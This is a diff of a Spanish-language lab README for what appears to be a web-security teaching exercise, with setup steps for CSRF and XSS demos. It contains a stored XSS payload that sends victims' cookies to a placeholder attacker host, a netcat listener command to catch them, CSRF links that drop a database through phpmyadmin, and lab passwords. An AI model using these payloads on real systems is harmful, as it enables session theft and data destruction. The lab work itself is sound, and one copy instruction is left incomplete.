@@ -49,8 +49,6 @@ mkdir test1; mkdir test2; ....mkdir testX
 
 luego copie las paginas web a desarrollar dentro de las carpetas de pruebas
 
-En el caso de CSRF copiar los archivos;
-
 - search.php
 - configdb.php
 - index.php
@@ -58,4 +56,23 @@ En el caso de CSRF copiar los archivos;
 
 2.- Iniciar una sesion de phpmyadmin, en el pc victima y ejecutar
 
-<a href="http://[HOST]/phpmyadmin/sql.php?sql_query=DROP+DATABASE+[DBNAME]">
+3.- copia los archivos que se encuentran en
+
+
+a la carpeta
+
+/var/www/html/xss
+
+el usuario admin tiene la clave 8888
+el usuario student tiene la clave 1234
+
+en el pc del atacante iniciar un netcat
+
+nc -lvp 80
+
+luego como usuario student ingresar al sistema y actualizar la capital de un pais, en el campo capital poner este codigo
+
+<a href=# onclick="document.location='http://IP_ATACKER/xss.php?c='+escape(document.cookie);">NOMBRE_CAPITAL</a>
+
+
+<a href="http://[HOST]/phpmyadmin/sql.php?sql_query=bbbDROP+DATABASE+[DBNAME]">
